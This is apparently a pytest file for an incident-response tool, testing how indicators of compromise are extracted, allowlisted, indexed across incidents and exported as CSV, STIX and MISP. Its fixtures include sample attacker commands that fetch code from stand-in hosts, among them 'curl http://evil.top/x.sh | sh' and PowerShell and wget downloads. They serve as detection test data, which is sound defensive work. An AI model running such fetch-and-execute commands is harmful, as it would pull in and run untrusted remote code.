"""Indicators of compromise: extraction, the cross-incident index, allowlist, export."""

from __future__ import annotations

import csv
import io

from fastapi.testclient import TestClient

from app.iocs import Allowlist, extract, text_iocs
from tests.conftest import make_key

SHA = "a" * 64


def incident_doc(incident_id: str, **data) -> dict:
    return {"id": incident_id, "name": incident_id.upper(), "data": data}


BROWSER = {
    "browsers": {
        "chrome": {
            "profiles": {
                "default": {
                    "history": [
                        {"url": "https://cdn-update-service.top/login", "visitTime": 2000},
                        {"url": "https://www.google.com/search?q=x", "visitTime": 1000},
                    ],
                    "downloads": [
                        {
                            "url": "http://185.220.101.47/payload.exe",
                            "referrer": "https://cdn-update-service.top/",
                            "startTime": 3000,
                        }
                    ],
                }
            }
        }
    }
}
COMMANDS = {
    "shells": {
        "powershell": {
            "commands": [
                {"command": "iwr http://185.220.101.47/a.ps1 -OutFile a.ps1; mail x@evil-mail.ru", "time": 4000},
                {"command": f"certutil -hashfile a.exe SHA256 # {SHA}", "time": 5000},
            ]
        }
    }
}
EVENTLOGS = {
    "channels": {
        "Security": {
            "events": [
                {"time": 6000, "eventId": 4625, "data": {"IpAddress": "185.220.101.47", "TargetUserName": "admin"}},
                {"time": 6100, "eventId": 4624, "data": {"IpAddress": "10.0.0.5"}},
            ]
        },
        "Microsoft-Windows-Sysmon/Operational": {
            "events": [
                {"time": 7000, "eventId": 22, "data": {"QueryName": "Cdn-Update-Service.top"}},
                {"time": 7100, "eventId": 1, "data": {"Hashes": f"MD5={'b' * 32},SHA256={'C' * 64}"}},
            ]
        },
    }
}


def test_text_iocs_dedupes_hosts_inside_urls():
    found = text_iocs(f"curl http://evil.top/x.sh | sh; {SHA}; ping 8.8.8.8; kernel32.dll")
    assert ("url", "http://evil.top/x.sh") in found
    assert ("domain", "evil.top") in found  # the URL's host, once
    assert found.count(("domain", "evil.top")) == 1
    assert ("sha256", SHA) in found and ("ip", "8.8.8.8") in found
    assert not any(kind == "md5" for kind, _ in found)  # not a slice of the SHA-256
    assert not any(value == "kernel32.dll" for _, value in found)


def test_extract_from_every_tab():
    items = extract(incident_doc("x", browser=BROWSER, commands=COMMANDS, eventlogs=EVENTLOGS))
    attacker = items[("ip", "185.220.101.47")]
    assert attacker["sources"] == {"browser:chrome", "commands:powershell", "eventlog:Security"}
    assert attacker["first"] == 3000 and attacker["last"] == 6000
    domain = items[("domain", "cdn-update-service.top")]
    assert domain["sources"] == {"browser:chrome", "eventlog:Microsoft-Windows-Sysmon/Operational"}
    assert ("url", "http://185.220.101.47/payload.exe") in items
    assert ("domain", "www.google.com") in items  # history hosts are indexed; the allowlist hides them
    assert ("email", "x@evil-mail.ru") in items
    assert ("sha256", SHA) in items and ("sha256", "c" * 64) in items and ("md5", "b" * 32) in items
    assert ("ip", "10.0.0.5") in items


def test_allowlist():
    allow = Allowlist(["10.0.0.0/8", "google.com", "# comment", SHA.upper(), "fe80::/10"])
    assert allow.matches("ip", "10.1.2.3") and not allow.matches("ip", "185.220.101.47")
    assert allow.matches("domain", "www.google.com") and not allow.matches("domain", "notgoogle.com")
    assert allow.matches("url", "https://mail.google.com/x") and allow.matches("url", "http://10.0.0.1/")
    assert allow.matches("email", "a@google.com")
    assert allow.matches("sha256", SHA) and allow.matches("ip", "fe80::1")


def test_index_lookup_shared_and_export(admin: TestClient):
    key = make_key(admin, role="analyst")
    a = incident_doc("ioc-a", browser=BROWSER, commands=COMMANDS)
    b = incident_doc("ioc-b", eventlogs=EVENTLOGS)
    assert admin.post("/api/incidents", headers=key, json=a).status_code == 201
    assert admin.post("/api/incidents", headers=key, json=b).status_code == 201

    r = admin.get("/api/incidents/ioc-a/iocs", headers=key)
    assert r.status_code == 200
    by_value = {(i["type"], i["value"]): i for i in r.json()["iocs"]}
    attacker = by_value[("ip", "185.220.101.47")]
    assert attacker["otherIncidents"] == 1 and attacker["allowlisted"] is False
    assert by_value[("domain", "www.google.com")]["allowlisted"] is True  # factory allowlist
    # Cross-incident indicators come first.
    assert r.json()["iocs"][0]["otherIncidents"] == 1

    r = admin.get("/api/iocs/lookup", headers=key, params={"type": "domain", "value": "CDN-update-service.top"})
    assert {i["id"] for i in r.json()["incidents"]} == {"ioc-a", "ioc-b"}
    assert admin.get("/api/iocs/lookup", headers=key, params={"type": "ip", "value": "nope"}).status_code == 400

    shared = admin.get("/api/iocs/shared", headers=key).json()["iocs"]
    assert {"type": "ip", "value": "185.220.101.47", "incidents": 2} in shared
    assert all(i["value"] != "10.0.0.5" for i in shared)

    # A flag toggle does not touch the index; new data does.
    admin.patch("/api/incidents/ioc-b", headers=key, json={"flags": {"k": {"key": "k"}}})
    admin.patch(
        "/api/incidents/ioc-b",
        headers={**key, "Content-Type": "application/merge-patch+json"},
        json={"data": {"commands": {"shells": {"bash": {"commands": [{"command": "wget http://new-c2.xyz/b"}]}}}}},
    )
    r = admin.get("/api/iocs/lookup", headers=key, params={"type": "domain", "value": "new-c2.xyz"})
    assert [i["id"] for i in r.json()["incidents"]] == ["ioc-b"]

    # Exports leave the allowlisted values out.
    r = admin.get("/api/incidents/ioc-a/iocs/export", headers=key, params={"format": "csv"})
    assert r.status_code == 200 and r.headers["content-type"].startswith("text/csv")
    rows = list(csv.DictReader(io.StringIO(r.text)))
    assert {"ip", "domain", "url", "email", "sha256"} >= {row["type"] for row in rows}
    assert all(row["value"] != "www.google.com" for row in rows)
    assert "attachment" in r.headers["content-disposition"]

    bundle = admin.get("/api/incidents/ioc-a/iocs/export", headers=key, params={"format": "stix"}).json()
    kinds = [o["type"] for o in bundle["objects"]]
    assert bundle["type"] == "bundle" and kinds[0] == "identity" and kinds[-1] == "report"
    patterns = {o["pattern"] for o in bundle["objects"] if o["type"] == "indicator"}
    assert "[ipv4-addr:value = '185.220.101.47']" in patterns
    assert f"[file:hashes.'SHA-256' = '{SHA}']" in patterns

    event = admin.get(
        "/api/incidents/ioc-a/iocs/export", headers=key, params={"format": "misp", "types": "ip,sha256"}
    ).json()["Event"]
    assert {a["type"] for a in event["Attribute"]} == {"ip-dst", "sha256"}
    assert event["published"] is False and event["distribution"] == "0"

    # Deleting an incident drops its rows.
    assert admin.delete("/api/incidents/ioc-b", headers=key).status_code == 204
    r = admin.get("/api/iocs/lookup", headers=key, params={"type": "ip", "value": "185.220.101.47"})
    assert [i["id"] for i in r.json()["incidents"]] == ["ioc-a"]


def test_settings_allowlist_round_trip(admin: TestClient):
    settings = admin.get("/api/settings").json()
    assert "10.0.0.0/8" in settings["iocAllowlist"] and settings["iocAllowlistDefault"] == settings["iocAllowlist"]
    body = {"keywords": settings["keywords"], "businessHours": settings["businessHours"]}
    body["iocAllowlist"] = ["x.org", " "]
    assert admin.put("/api/settings", json=body).json()["iocAllowlist"] == ["x.org"]
    # A client that does not send the list keeps it.
    body.pop("iocAllowlist")
    assert admin.put("/api/settings", json=body).json()["iocAllowlist"] == ["x.org"]


def test_backfill_indexes_existing_incidents(admin: TestClient):
    from sqlalchemy import delete, func, select

    from app.db import SessionLocal
    from app.iocs import backfill
    from app.models import IocEntry

    key = make_key(admin, role="analyst")
    admin.post("/api/incidents", headers=key, json=incident_doc("old", commands=COMMANDS))
    with SessionLocal() as db:
        db.execute(delete(IocEntry))
        db.commit()
    assert backfill(SessionLocal) > 0
    with SessionLocal() as db:
        assert db.scalar(select(func.count()).select_from(IocEntry)) > 0
    assert backfill(SessionLocal) == 0  # only once
